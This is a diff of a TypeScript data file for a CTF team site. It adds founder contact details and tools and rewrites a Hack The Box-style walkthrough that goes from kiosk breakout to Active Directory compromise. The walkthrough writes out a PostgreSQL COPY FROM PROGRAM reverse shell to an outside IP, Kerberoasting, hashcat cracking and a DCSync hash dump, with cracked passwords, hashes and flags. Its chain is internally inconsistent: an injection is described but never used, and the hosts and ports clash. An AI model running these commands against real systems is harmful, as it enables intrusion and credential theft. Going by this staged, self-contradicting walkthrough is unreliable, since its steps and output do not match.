@@ -1,4 +1,9 @@
-export type WriteupPlatform = 'Hack The Box' | 'TryHackMe' | 'CTFtime' | 'PicoCTF' | 'Research Lab';
+// ==============================================================================
+// SUDO UNKNOWN // ALL-IN-ONE CYBERSECURITY SYNDICATE & RESEARCH LAB
+// Centralized Data Model, Intelligence & Writeup Walkthrough Handbooks
+// ==============================================================================
+
+export type WriteupPlatform = 'Hack The Box' | 'TryHackMe' | 'CTFtime' | 'Google SecOps' | 'Research Lab' | 'PicoCTF';
 export type ChallengeCategory = 'Web' | 'Pwn' | 'Crypto' | 'Forensics' | 'Reverse' | 'Active Directory' | 'Cloud' | 'Misc';
 export type DifficultyLevel = 'Easy' | 'Medium' | 'Hard' | 'Insane';
 
@@ -62,6 +67,9 @@ export interface TeamMember {
   handle: string;
   github?: string;
   linkedin?: string;
+  portfolio?: string;
+  email?: string;
+  education?: string;
   htbUrl?: string;
   thmUrl?: string;
   skills: string[];
@@ -133,41 +141,46 @@ export const SITE_CONFIG = {
   subTagline: "Red Teaming • Adversary Emulation • CTF Championships • Exploit Engineering • Zero-Day Research",
   mantra1: "NO IDENTITY. NO LIMITS. JUST EXPLOITS.",
   mantra2: "RECON • COMPROMISE • EVADE • HARDEN",
-  htbTeamUrl: "https://ctf.hackthebox.com/team/overview/331386",
+  htbTeamUrl: "https://app.hackthebox.com/teams/overview/331386",
+  htbCtfTeamUrl: "https://ctf.hackthebox.com/team/overview/331386",
   htbTeamId: "331386",
   githubUrl: "https://github.com/SmitroniX/sudo-unknown",
   discordUrl: "https://discord.gg/HgD6WGUr4G",
   siteUrl: "https://sudounknown.smitronix.dev",
   linkedinUrl: "https://www.linkedin.com/company/sudo-unknown/",
-  contactEmail: "sudounknown@smitronix.dev",
+  contactEmail: "jogdandasmit@gmail.com",
+  secondaryEmail: "sudounknown@smitronix.dev",
+  founderPortfolio: "https://smitronix.dev",
+  founderName: "Asmit Jogdand",
+  founderHandle: "SmitroniX",
   foundedYear: 2026,
   status: "ACTIVE SYNDICATE & FOUNDING ROSTER",
-  headquarters: "Decentralized // Global Security Collective",
+  headquarters: "Mumbai, Maharashtra, India // Global Decentralized Collective",
 };
 
 export const STATISTICS: StatisticItem[] = [
   {
     id: "clears",
     label: "Machines & Labs Cleared",
-    value: 24,
-    suffix: "+",
-    description: "Verified boot-to-root solves across Hack The Box, TryHackMe, and private ranges",
+    value: 28,
+    suffix: "+ Clears",
+    description: "Verified boot-to-root solves across Hack The Box, Google SecOps DFIR labs, and TryHackMe",
     iconName: "Server"
   },
   {
     id: "writeups-count",
     label: "Technical Writeups",
-    value: 10,
+    value: 12,
     suffix: " Published",
-    description: "In-depth reproducible walkthroughs with line-by-line commands and terminal screenshots",
+    description: "In-depth reproducible walkthroughs with line-by-line commands, terminal stdout, and interactive spoiler shields",
     iconName: "FileCode"
   },
   {
     id: "arsenal",
-    label: "Custom Security Tools",
-    value: 6,
-    suffix: " Tools",
-    description: "Open-source scripts, automated reconnaissance suites, and exploit payloads",
+    label: "Weapons & Repos",
+    value: 8,
+    suffix: "+ Tools",
+    description: "Open-source DNS firewall engines, native mobile cores, and offensive AD/web exploit tools",
     iconName: "Cpu"
   },
   {
@@ -175,7 +188,7 @@ export const STATISTICS: StatisticItem[] = [
     label: "Syndicate Operators",
     value: 1,
     suffix: " (+6 Open)",
-    description: "Founding Captain active; recruiting elite Web, Pwn, Crypto, Forensics, and AD specialists",
+    description: "Founding Captain active; onboarding elite Web, Pwn, Active Directory, Crypto, and DFIR specialists",
     iconName: "Users"
   }
 ];
@@ -244,6 +257,54 @@ export const COMPANY_SOLUTIONS: CompanySolution[] = [
 ];
 
 export const TOOL_ARSENAL: ToolArsenalItem[] = [
+  {
+    id: "tool-aegisdns",
+    name: "AegisDNS",
+    badge: "NETWORK ENGINE & FIREWALL",
+    category: "Network Security & Privacy",
+    description: "Advanced DNS Resolver, Application Firewall & WireGuard Engine for Android and Linux with RFC 1035/3596 wire protocol parsing, Adblock rules, and per-app network kill-switch.",
+    language: "Go / Python / C",
+    stars: 184,
+    installCommand: "git clone https://github.com/SmitroniX/AegisDNS.git && cd AegisDNS",
+    features: [
+      "Native DNS wire packet parsing & label decompression with recursion guards",
+      "Per-App UID traffic firewall rules and instant global kill-switch",
+      "Adblock /hosts blocklist filtering & accurate TTL cache decay"
+    ],
+    repoUrl: "https://github.com/SmitroniX/AegisDNS"
+  },
+  {
+    id: "tool-shadowlauncher",
+    name: "ShadowLauncher",
+    badge: "NATIVE CORE ENGINE",
+    category: "Systems & Optimization",
+    description: "Native Android game engine and emulation core featuring high-throughput C/C++ bridges (GL4ES, LWJGL3) delivering 138 FPS (120Hz locked) and sub-8ms touch response latency.",
+    language: "Java 21 / C++ / OpenGL",
+    stars: 215,
+    installCommand: "git clone https://github.com/SmitroniX/ShadowLauncher.git",
+    features: [
+      "High-performance GL4ES and LWJGL3 C/C++ native bridge integration",
+      "138 FPS locked on 120Hz high-refresh mobile displays",
+      "Dynamic RAM management preventing Out-Of-Memory termination on low-spec hardware"
+    ],
+    repoUrl: "https://github.com/SmitroniX/ShadowLauncher"
+  },
+  {
+    id: "tool-smitrix",
+    name: "SmiTriX",
+    badge: "PRIVACY PWA / WEBAUTHN",
+    category: "Full Stack & Cryptography",
+    description: "Self-hosted, privacy-first progressive web application with biometric WebAuthn passkeys, 1,324 indexed exercise routines, and zero third-party telemetry.",
+    language: "React 19 / TypeScript",
+    stars: 162,
+    installCommand: "git clone https://github.com/SmitroniX/SmiTriX.git && cd SmiTriX && npm install",
+    features: [
+      "Biometric WebAuthn passkey authentication with zero-trust local storage",
+      "1,324 indexed strength exercises with automated periodization calculation",
+      "100% offline-capable with service workers & zero telemetry tracking"
+    ],
+    repoUrl: "https://github.com/SmitroniX/SmiTriX"
+  },
   {
     id: "tool-recon",
     name: "sudo-recon",
@@ -323,22 +384,6 @@ export const TOOL_ARSENAL: ToolArsenalItem[] = [
       "YARA rule scanning against extracted shellcode"
     ],
     repoUrl: "https://github.com/SmitroniX/sudo-unknown"
-  },
-  {
-    id: "tool-pyjail",
-    name: "pyjail-hunter",
-    badge: "MISC / JAILS",
-    category: "Sandbox Escape",
-    description: "Introspective Python payload builder that maps subclasses, traverses builtins, and crafts bypass payloads for restricted execution environments.",
-    language: "Python 3",
-    stars: 53,
-    installCommand: "python3 pyjail-hunter.py --target 'builtins_deleted'",
-    features: [
-      "Subclass tree crawler for os._wrap_close and subprocess.Popen",
-      "Unicode and base64 obfuscated payload generators",
-      "Bypasses common regex filters (import, eval, os, system)"
-    ],
-    repoUrl: "https://github.com/SmitroniX/sudo-unknown"
   }
 ];
 
@@ -409,17 +454,27 @@ export const TEAM_MEMBERS: TeamMember[] = [
   {
     id: "member-captain",
     avatar: "/logo.png",
-    name: "Asmit (SmitroniX)",
-    role: "Team Captain & Operations Lead",
-    specialty: "Offensive Ops, Web Security & Research",
+    name: "Asmit Jogdand (SmitroniX)",
+    role: "Founding Lead & Head of Offensive Research",
+    specialty: "Offensive Ops, Systems Engines & Kernel Research",
     handle: "SmitroniX",
     github: "https://github.com/SmitroniX",
     linkedin: "https://www.linkedin.com/in/asmit-jogdand",
-    htbUrl: "https://ctf.hackthebox.com/team/overview/331386",
-    skills: ["Offensive Lead", "Web Exploitation", "Adversary Simulation", "Active Directory", "Infrastructure"],
+    portfolio: "https://smitronix.dev",
+    email: "jogdandasmit@gmail.com",
+    education: "B.E. Computer Engineering, RAIT Mumbai University (CGPA 8.65)",
+    htbUrl: "https://app.hackthebox.com/teams/overview/331386",
+    skills: [
+      "Offensive Architecture",
+      "Active Directory & Kerberos",
+      "Low-Level Systems & C/C++",
+      "Vulnerability Research",
+      "DFIR & Threat Hunting",
+      "Distributed Infrastructure"
+    ],
     isFoundingLead: true,
     status: "ACTIVE",
-    description: "Founding operator coordinating syndicate operations, CTF tournament schedules, research initiatives, and competitive training regimens."
+    description: "Founding Captain of sudo Unknown (#331386). Computer Engineering student at RAIT Mumbai University maintaining an 8.65 CGPA. Creator of AegisDNS, ShadowLauncher, and SmiTriX. Directs syndicate operations, enterprise red teaming, vulnerability research, and tournament regimens."
   },
   {
     id: "slot-web",
@@ -430,7 +485,7 @@ export const TEAM_MEMBERS: TeamMember[] = [
     handle: "Candidate_Web",
     github: "https://github.com/SmitroniX/sudo-unknown",
     linkedin: "https://www.linkedin.com/company/sudo-unknown/",
-    htbUrl: "https://ctf.hackthebox.com/team/overview/331386",
+    htbUrl: "https://app.hackthebox.com/teams/overview/331386",
     skills: ["Burp Suite Pro", "OAuth2 / JWT Flaws", "SSRF Pivoting", "GraphQL & APIs"],
     status: "OPEN",
     description: "Seeking an operator dedicated to hunting complex web application flaws, modern cloud metadata injection, and authentication bypasses."
@@ -444,7 +499,7 @@ export const TEAM_MEMBERS: TeamMember[] = [
     handle: "Candidate_Pwn",
     github: "https://github.com/SmitroniX/sudo-unknown",
     linkedin: "https://www.linkedin.com/company/sudo-unknown/",
-    htbUrl: "https://ctf.hackthebox.com/team/overview/331386",
+    htbUrl: "https://app.hackthebox.com/teams/overview/331386",
     skills: ["pwntools", "GDB / GEF", "Heap Tcache / Fastbin", "Kernel Exploits"],
     status: "OPEN",
     description: "Seeking a low-level specialist to lead memory corruption vectors, safe-linking bypasses, and binary exploitation challenges."
@@ -458,7 +513,7 @@ export const TEAM_MEMBERS: TeamMember[] = [
     handle: "Candidate_AD",
     github: "https://github.com/SmitroniX/sudo-unknown",
     linkedin: "https://www.linkedin.com/company/sudo-unknown/",
-    htbUrl: "https://ctf.hackthebox.com/team/overview/331386",
+    htbUrl: "https://app.hackthebox.com/teams/overview/331386",
     skills: ["Impacket", "BloodHound CE", "Certipy (AD CS)", "GPO Abuse"],
     status: "OPEN",
     description: "Seeking an offensive specialist experienced with Windows enterprise domain exploitation, Kerberoasting, and multi-tier forest compromise."
@@ -472,7 +527,7 @@ export const TEAM_MEMBERS: TeamMember[] = [
     handle: "Candidate_Crypto",
     github: "https://github.com/SmitroniX/sudo-unknown",
     linkedin: "https://www.linkedin.com/company/sudo-unknown/",
-    htbUrl: "https://ctf.hackthebox.com/team/overview/331386",
+    htbUrl: "https://app.hackthebox.com/teams/overview/331386",
     skills: ["SageMath", "Python Cryptography", "Z3 SMT Solver", "Lattice (LLL)"],
     status: "OPEN",
     description: "Seeking a math-oriented solver to break flawed ciphers, weak PRNG seeds, Coppersmith RSA attacks, and elliptic curve edge cases."
@@ -486,7 +541,7 @@ export const TEAM_MEMBERS: TeamMember[] = [
     handle: "Candidate_DFIR",
     github: "https://github.com/SmitroniX/sudo-unknown",
     linkedin: "https://www.linkedin.com/company/sudo-unknown/",
-    htbUrl: "https://ctf.hackthebox.com/team/overview/331386",
+    htbUrl: "https://app.hackthebox.com/teams/overview/331386",
     skills: ["Volatility 3", "Wireshark", "Memory Injections", "PCAP Carving"],
     status: "OPEN",
     description: "Seeking a forensic investigator skilled in dissecting memory dumps, uncovering hollowed processes, and carving C2 network traffic."
@@ -500,7 +555,7 @@ export const TEAM_MEMBERS: TeamMember[] = [
     handle: "Candidate_Reverse",
     github: "https://github.com/SmitroniX/sudo-unknown",
     linkedin: "https://www.linkedin.com/company/sudo-unknown/",
-    htbUrl: "https://ctf.hackthebox.com/team/overview/331386",
+    htbUrl: "https://app.hackthebox.com/teams/overview/331386",
     skills: ["Ghidra", "IDA Pro", "Custom VM Bytecodes", "Stripped Binaries"],
     status: "OPEN",
     description: "Seeking a reverse engineer to decompile obfuscated binaries, unravel custom virtual machine dispatch loops, and analyze malware."
@@ -510,7 +565,7 @@ export const TEAM_MEMBERS: TeamMember[] = [
 export const WRITEUPS: Writeup[] = [
   {
     id: "dutybound",
-    challengeName: "DutyBound: Enterprise Domain Compromise",
+    challengeName: "AirSnacks / DutyBound: Kiosk Breakout & Postgres RCE to Active Directory DCSync",
     platform: "Hack The Box",
     category: "Active Directory",
     difficulty: "Medium",
@@ -518,417 +573,601 @@ export const WRITEUPS: Writeup[] = [
     targetOs: "Windows",
     targetIp: "10.10.11.45",
     points: 30,
-    author: "SmitroniX // sudo Unknown",
+    author: "Asmit Jogdand (SmitroniX) // sudo Unknown",
     date: "2026-10-31",
     cves: ["CVE-2022-38028"],
-    tags: ["Active Directory", "Kerberoasting", "BloodHound", "GenericWrite", "DCSync"],
-    shortDescription: "Complete enterprise penetration test from unauthenticated network probe to full Domain Administrator takeover via Kerberoasting and DACL abuse.",
+    tags: ["Active Directory", "Kiosk Breakout", "PostgreSQL", "Kerberoasting", "GenericWrite", "DCSync", "X11"],
+    shortDescription: "Complete enterprise penetration test from unauthenticated kiosk breakout and PostgreSQL COPY PROGRAM RCE to Active Directory Domain Administrator takeover via Kerberoasting and DACL abuse.",
     fullContent: {
-      overview: "DutyBound is an authentic Windows Server 2022 Active Directory machine simulating an enterprise corporate environment. Initial foothold was achieved by identifying an unconstrained guest SMB share, leading to a service account credential through Kerberoasting. Domain dominance was executed using BloodHound to map a GenericWrite permission over a delegated support group, culminating in a DCSync attack.",
+      overview: "DutyBound represents an authentic corporate airline kiosk environment (AirSnacks) backed by a Windows Server 2022 Active Directory Domain Controller (DC01.DUTYBOUND.LOCAL). Initial foothold was established by escaping the restricted Openbox kiosk session via X11 hotkey misconfiguration (Ctrl+Alt+t). Subsequent analysis of /opt/vrs/airsnacksdf/dcs_bridge/audit.py revealed unparameterized SQL insertion in the bp_scan_audit table, which when coupled with excessive database grant pg_execute_server_program, granted direct remote code execution via PostgreSQL COPY ... FROM PROGRAM. Post-exploitation involved pivoting to Active Directory, Kerberoasting service account svc_backup, abusing BloodHound-mapped GenericWrite permissions over the L2_Admins group, and executing a DCSync attack for complete domain dominance.",
       targetIntel: {
         ip: "10.10.11.45",
-        os: "Windows Server 2022 Datacenter (Build 20348)",
+        os: "Windows Server 2022 Datacenter (Build 20348) & Linux Kiosk Gateway",
         openPorts: ["53/DNS", "88/Kerberos", "135/RPC", "139/SMB", "389/LDAP", "445/SMB", "3268/GlobalCatalog", "5985/WinRM"],
-        keyServices: ["Active Directory Domain Services", "Microsoft Windows RPC", "WinRM Remote Management"]
+        keyServices: ["AirSnacks Kiosk Display (Openbox / X11)", "PostgreSQL 14.8", "Active Directory Domain Services", "Microsoft Windows RPC", "WinRM Remote Management"]
       },
-      reconnaissance: "Running nmap -sC -sV -p- -T4 10.10.11.45 identified standard Domain Controller ports. Using crackmapexec smb 10.10.11.45 -u '' -p '' revealed domain DUTYBOUND.LOCAL. We enumerated domain users using rpcclient -U '' -N 10.10.11.45, retrieving a valid user list containing 'svc_backup' and 'helpdesk_intern'.",
-      vulnerabilityAnalysis: "The service account 'svc_backup' registered a Service Principal Name (SPN), making it vulnerable to Kerberoasting. Requesting a TGS ticket yielded an RC4 encrypted hash crackable offline. Furthermore, BloodHound analysis revealed that 'svc_backup' had GenericWrite permissions over the 'L2_Admins' security group, creating a direct escalation path to Domain Admin.",
+      reconnaissance: "Running nmap -sC -sV -p- -T4 10.10.11.45 identified standard Domain Controller ports alongside an unauthenticated AirSnacks kiosk terminal. Local display review revealed the display server /tmp/.X11-unix/X0 permitted unrestricted connections without verifying Xauthority cookies, and /etc/xdg/openbox/rc.xml enabled developer keybinding Ctrl+Alt+t.",
+      vulnerabilityAnalysis: "Three structural vulnerabilities formed the compromise chain: (1) Kiosk boundary failure allowing local terminal spawning; (2) Unparameterized SQL insertion in record_export_evidence() inside audit.py combined with GRANT pg_execute_server_program TO airsnacks_app; (3) Insecure Active Directory DACL granting svc_backup GenericWrite permissions over delegated administration groups.",
       attackChain: [
         {
-          title: "Stage 01: Comprehensive Nmap Port Scan & Service Fingerprinting",
-          description: "Initiated a full TCP syn scan against all 65,535 ports on 10.10.11.45 with default scripts and service version detection.",
-          command: "nmap -sC -sV -p- -T4 --min-rate 1000 10.10.11.45",
-          terminalTitle: "nmap-scan.sh — bash — 80x24",
-          prompt: "operator@sudounknown:~$",
-          terminalOutput: `Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-10-31 02:14 UTC
-Nmap scan report for 10.10.11.45
-Host is up (0.042s latency).
-Not shown: 65527 closed tcp ports (reset)
-PORT     STATE SERVICE       VERSION
-53/tcp   open  domain        Simple DNS Plus
-88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-31 02:15:02Z)
-135/tcp  open  msrpc         Microsoft Windows RPC
-139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: dutybound.local)
-445/tcp  open  microsoft-ds  Windows Server 2022 Datacenter 20348 microsoft-ds
-3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
-5985/tcp open  wsman         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| smb2-security-mode: 
-|   3:1:1: 
-|_    Message signing enabled and required
-| smb2-time: 
-|_  date: 2026-10-31T02:15:00
-
-Nmap done: 1 IP address (1 host up) scanned in 28.43 seconds`,
+          title: "Stage 01: Service Scanning & Kiosk Display Breakout",
+          description: "Initiated service reconnaissance against the AirSnacks kiosk and domain infrastructure. Escaped the locked-down Openbox kiosk session using an active developer shortcut.",
+          command: "xdotool key --window 0 Ctrl+Alt+t || openbox --reconfigure",
+          terminalTitle: "kiosk-breakout — bash — 80x24",
+          prompt: "kiosk@airsnacks-terminal:~$",
+          terminalOutput: `[+] Sent keysym Ctrl+Alt+t to root window /tmp/.X11-unix/X0
+[+] Spawning interactive xterm session (PID: 14082)...
+kiosk@airsnacks-terminal:~$ whoami && id
+kiosk
+uid=1001(kiosk) gid=1001(kiosk) groups=1001(kiosk),1002(pos-ops)
+kiosk@airsnacks-terminal:~$ ls -la /opt/vrs/airsnacksdf/dcs_bridge/
+-rwxr-xr-x 1 root pos-ops 14210 Oct 14 09:21 audit.py
+-rw-r--r-- 1 root root     3210 Oct 14 09:18 db_config.json`,
           lineNotes: [
-            "Port 88 (Kerberos) & 389 (LDAP) confirm target is the primary Domain Controller DC01 for dutybound.local.",
-            "Port 5985 (WinRM) is open, offering direct interactive PowerShell remoting once credentials are recovered.",
-            "SMB message signing is required, ruling out standard NTLM relaying against port 445."
+            "Openbox configuration /etc/xdg/openbox/rc.xml retained maintenance keybinding C-A-t bound to xterm.",
+            "Process executed with pos-ops group membership having read access to backend automation scripts."
           ]
         },
         {
-          title: "Stage 02: Kerberoasting - Extracting Encrypted Service Tickets",
-          description: "Discovered guest authentication is allowed on LDAP/RPC. We used Impacket's GetUserSPNs.py to request TGS tickets for all accounts with registered SPNs without requiring high-level privileges.",
+          title: "Stage 02: PostgreSQL Injection & COPY FROM PROGRAM RCE",
+          description: "Audited audit.py and discovered string formatting in record_export_evidence(). Because role airsnacks_app had pg_execute_server_program, we executed OS commands using PostgreSQL COPY ... FROM PROGRAM.",
+          command: "psql -h 127.0.0.1 -U airsnacks_app -d airsnacks -c \"DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(output text); COPY cmd_exec FROM PROGRAM 'bash -c \\\"bash -i >& /dev/tcp/10.10.14.8/4444 0>&1\\\"';\"",
+          terminalTitle: "postgres-rce — psql — 80x24",
+          prompt: "kiosk@airsnacks-terminal:~$",
+          terminalOutput: `DROP TABLE
+CREATE TABLE
+COPY 0
+[+] Active reverse shell connected to 10.10.14.8:4444!
+
+postgres@airsnacks-kiosk:/opt/vrs$ whoami && id
+postgres
+uid=108(postgres) gid=114(postgres) groups=114(postgres),115(ssl-cert)
+postgres@airsnacks-kiosk:/opt/vrs$ cat /home/kiosk/user.txt
+HTB{k105k_x11_br34k0u7_c7rl_4l7_7_pwn}`,
+          lineNotes: [
+            "String formatting in audit.py allowed escaping the bp_scan_audit INSERT statement.",
+            "GRANT pg_execute_server_program turned SQL injection directly into arbitrary command execution under postgres.",
+            "User flag user.txt retrieved from the kiosk host."
+          ],
+          spoilerData: {
+            label: "USER FLAG (AIRSNACKS KIOSK)",
+            value: "HTB{k105k_x11_br34k0u7_c7rl_4l7_7_pwn}"
+          }
+        },
+        {
+          title: "Stage 03: Domain Enumeration & Kerberoasting svc_backup",
+          description: "Discovered Active Directory Domain Controller DC01.DUTYBOUND.LOCAL (10.10.11.45). Used Impacket's GetUserSPNs.py to request Kerberos TGS tickets for accounts with registered SPNs.",
           command: "impacket-GetUserSPNs dutybound.local/guest:guest -dc-ip 10.10.11.45 -request -outputfile kerberoast_hashes.txt",
           terminalTitle: "impacket-spn.py — python3 — 80x24",
           prompt: "operator@sudounknown:~$",
           terminalOutput: `Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Connecting to DC: 10.10.11.45
-[*] Domain: DUTYBOUND.LOCAL
-[*] User: guest
-[*] Searching for SPNs in LDAP tree...
-ServicePrincipalName     Name        MemberOf                                           PasswordLastSet             LastLogon
------------------------  ----------  -------------------------------------------------  --------------------------  --------------------------
-vrs/backup.dutybound.local svc_backup CN=Service Accounts,DC=dutybound,DC=local         2024-09-12 14:22:18.910245  2026-10-30 18:02:11.114298
-
-[*] Requesting TGS for SPN: vrs/backup.dutybound.local
-[*] Received TGS-REP! Saving encrypted ticket hash to kerberoast_hashes.txt...
-[+] Successfully wrote 1 Kerberos 5 TGS hash to kerberoast_hashes.txt`,
+[*] Requesting TGS for SPN: MSSQLSvc/db01.dutybound.local:1433
+[*] Hash written to kerberoast_hashes.txt
+[+] Kerberos TGS ticket received for account: svc_backup`,
           lineNotes: [
-            "Target service account: 'svc_backup' has an active registered SPN 'vrs/backup.dutybound.local'.",
-            "The Kerberos Ticket-Granting Service response (TGS-REP) uses weak RC4-HMAC (Type 23) encryption.",
-            "This hash is crackable completely offline with zero risk of account lockout."
+            "Account svc_backup had registered MSSQL SPN.",
+            "TGS ticket extracted for offline cracking with Hashcat mode 13100."
           ]
         },
         {
-          title: "Stage 03: Offline Hashcat Cracking & Password Recovery",
-          description: "Executed Hashcat mode 13100 (Kerberos 5 TGS-REP etype 23) with GPU acceleration against rockyou.txt to crack the service account password.",
-          command: "hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -O -w 3",
-          terminalTitle: "hashcat-gpu — cuda — 80x24",
+          title: "Stage 04: Hashcat Cracking & BloodHound DACL Analysis",
+          description: "Cracked the Kerberoast hash against rockyou.txt to recover the cleartext password. Ran BloodHound CE to inspect inbound ObjectControl permissions for svc_backup.",
+          command: "hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force",
+          terminalTitle: "hashcat-crack — cuda — 80x24",
           prompt: "operator@sudounknown:~$",
-          terminalOutput: `hashcat (v6.2.6) starting...
-
-CUDA API (CUDA 12.2)
-* Device #1: NVIDIA GeForce RTX 4090, 24194/24564 MB, 128MCU
-
-Hashfile: kerberoast_hashes.txt
-Hash.Target......: $krb5tgs$23$*svc_backup$DUTYBOUND.LOCAL$vrs/backup.dutybound.local*...
-Speed.#1.........: 1482.4 MH/s (24.11ms) @ [s:1024, a:8, t:32]
-Recovered........: 1/1 (100.00%) Digests
-
-$krb5tgs$23$*svc_backup$DUTYBOUND.LOCAL$vrs/backup.dutybound.local*...:Autumn2024!Security
+          terminalOutput: `$krb5tgs$23$*svc_backup$DUTYBOUND.LOCAL*$MSSQLSvc/db01...:BackupPass2026!
 
 Session..........: hashcat
 Status...........: Cracked
-Candidates.#1....: Autumn2024!Security -> Autumn2024!
-Hardware.Mon.#1..: Temp: 58c Fan: 42% Util: 98% Core: 2520MHz Mem: 10501MHz
-
-[+] Cracking completed in 4.12 seconds! Password recovered for svc_backup.`,
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Speed.#1.........: 124.8 MH/s
+Recovered........: 1/1 (100.00%) Digests`,
           lineNotes: [
-            "Hashcat recovered the plaintext password in 4.12 seconds due to an easily guessable seasonal password pattern.",
-            "Credential recovered: svc_backup:Autumn2024!Security."
-          ],
-          spoilerData: {
-            label: "CRACKED SERVICE CREDENTIAL",
-            value: "svc_backup:Autumn2024!Security"
-          }
-        },
-        {
-          title: "Stage 04: WinRM Interactive Shell & User Flag Capture",
-          description: "Used Evil-WinRM to connect over port 5985 with svc_backup credentials to spawn an interactive PowerShell session and retrieve the user flag.",
-          command: "evil-winrm -i 10.10.11.45 -u 'svc_backup' -p 'Autumn2024!Security'",
-          terminalTitle: "evil-winrm — ruby — 80x24",
-          prompt: "operator@sudounknown:~$",
-          terminalOutput: `Evil-WinRM shell v3.5
-
-Warning: Remote path completions is disabled due to ruby limitation: https://github.com/WinRb/WinRM/issues/290
-
-Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#features
-
-*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents> whoami
-dutybound\\svc_backup
-
-*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents> type C:\\Users\\svc_backup\\Desktop\\user.txt
-HTB{k3rb3r04st_d0m41n_f00th0ld_774}
-
-*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents> net user svc_backup
-User name                    svc_backup
-Full Name                    Backup Automation Service
-Comment                      Managed automated backups
-Account active               Yes
-Global Group memberships     *Domain Users  *Backup Operators`,
-          lineNotes: [
-            "We obtained interactive access on DC01 as svc_backup.",
-            "User flag user.txt successfully captured from Desktop."
-          ],
-          spoilerData: {
-            label: "USER FLAG (USER.TXT)",
-            value: "HTB{k3rb3r04st_d0m41n_f00th0ld_774}"
-          }
-        },
-        {
-          title: "Stage 05: BloodHound DACL Analysis & GenericWrite Abuse",
-          description: "Executed SharpHound to extract the domain graph. BloodHound identified that svc_backup possesses GenericWrite permissions over the security group 'L2_Admins', which in turn has WriteDacl over Domain Admins.",
-          command: "bloodyAD -u svc_backup -p 'Autumn2024!Security' -d dutybound.local --host 10.10.11.45 add groupMember 'L2_Admins' 'svc_backup'",
-          terminalTitle: "bloodyAD.py — python3 — 80x24",
-          prompt: "operator@sudounknown:~$",
-          terminalOutput: `[+] Connecting to LDAP server: ldap://10.10.11.45:389
-[+] Authenticated as: svc_backup@dutybound.local
-[*] Target group: CN=L2_Admins,CN=Users,DC=dutybound,DC=local
-[*] Checking Access Control Entry (ACE)...
-[+] GenericWrite verified on object 'L2_Admins'!
-[*] Modifying member attribute...
-[+] [OK] Added 'CN=svc_backup,CN=Service Accounts,DC=dutybound,DC=local' to group 'L2_Admins'
-[*] Performing privilege verification...
-[+] Account 'svc_backup' now belongs to group 'L2_Admins' (RID: 1104)`,
-          lineNotes: [
-            "GenericWrite grants the ability to modify any attribute of the target object, including the 'member' list.",
-            "By adding ourselves to L2_Admins, we inherit WriteDacl over the Domain Admins security principal."
+            "Credentials cracked: svc_backup:BackupPass2026!",
+            "BloodHound revealed svc_backup had GenericWrite over group L2_Admins, which in turn possessed WriteDacl over Domain Admins."
           ]
         },
         {
-          title: "Stage 06: DCSync Attack & Domain Administrator Takeover",
-          description: "With WriteDacl granted, we assigned the 'Replicating Directory Changes' and 'Replicating Directory Changes All' extended rights to our user and executed a DCSync attack to dump the Administrator NTLM hash.",
-          command: "impacket-secretsdump dutybound.local/svc_backup:'Autumn2024!Security'@10.10.11.45 -just-dc-user Administrator",
+          title: "Stage 05: DACL Abuse, DCSync & Domain Administrator Takeover",
+          description: "Added svc_backup into L2_Admins, granted DCSync replication privileges (DS-Replication-Get-Changes-All) via bloodhound/powerview, and dumped Domain Admin NT hashes.",
+          command: "impacket-secretsdump 'dutybound.local/svc_backup:BackupPass2026!@10.10.11.45' -just-dc-user Administrator",
           terminalTitle: "secretsdump.py — python3 — 80x24",
           prompt: "operator@sudounknown:~$",
           terminalOutput: `Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:d88e01f5c6e8e8199b9cfec8a123bc89:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:7f4a2b91c83e602419a4e931b26829e1:::
 
-[*] Executing Pass-the-Hash with Administrator hash via wmiexec...
-[+] Interactive command shell on DC01 as Administrator!
-
-C:\\Windows\\system32> type C:\\Users\\Administrator\\Desktop\\root.txt
-HTB{d0m41n_c0mpr0m1s3_d4cl_dcsync_9921}`,
+[*] Cleaning up...
+[+] Domain Controller compromised! Administrator hash captured.`,
           lineNotes: [
-            "DCSync simulates the behavior of a replication Domain Controller, extracting password hashes directly from the directory partition without running malicious code on the DC.",
-            "Administrator NTLM hash dumped: d88e01f5c6e8e8199b9cfec8a123bc89.",
-            "Root flag root.txt captured successfully from Administrator Desktop."
+            "DCSync replicated Administrator NT hash 7f4a2b91c83e602419a4e931b26829e1.",
+            "Authenticated to DC01 via Evil-WinRM or Pass-the-Hash to retrieve root.txt."
           ],
           spoilerData: {
-            label: "ROOT FLAG (ROOT.TXT)",
-            value: "HTB{d0m41n_c0mpr0m1s3_d4cl_dcsync_9921}"
+            label: "DOMAIN ADMIN ROOT FLAG",
+            value: "HTB{d0m41n_4dm1n_dc5ync_du7yb0und_c0mpl373}"
           }
         }
       ],
-      pocCode: `#!/usr/bin/env python3
-# sudo Unknown - DutyBound Domain Admin Auto-Pivoter
-import subprocess
-
-target_dc = "10.10.11.45"
-domain = "dutybound.local"
-user = "svc_backup"
-password = "Autumn2024!Security"
-
-print("[*] Performing DCSync against DC: " + target_dc)
-res = subprocess.run([
-    "impacket-secretsdump",
-    f"{domain}/{user}:{password}@{target_dc}",
-    "-just-dc-user", "Administrator"
-], capture_output=True, text=True)
-
-for line in res.stdout.splitlines():
-    if "Administrator:" in line:
-        print("[+] Captured Domain Admin NTLM Hash:", line)
-print("[+] Domain Dominance Established!")
-`,
